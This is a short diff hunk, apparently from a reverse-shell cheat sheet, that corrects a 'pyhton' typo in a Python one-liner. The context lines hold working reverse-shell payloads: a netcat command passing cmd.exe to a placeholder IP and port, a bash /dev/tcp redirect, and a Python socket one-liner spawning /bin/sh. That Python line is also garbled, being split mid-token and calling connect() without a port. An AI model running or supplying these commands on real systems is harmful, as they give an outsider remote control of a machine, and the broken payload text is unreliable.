@@ -37,6 +37,6 @@ nc <ip-address> <port> -e cmd.exe
 bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 
 #Python
-pyhton -c 'import socket,subprocess,os; s=socket.socket(socket.AF_IN
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_IN
 ET,socket.SOCK_STREAM); s.connect(("<IP_ADDRES>")); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
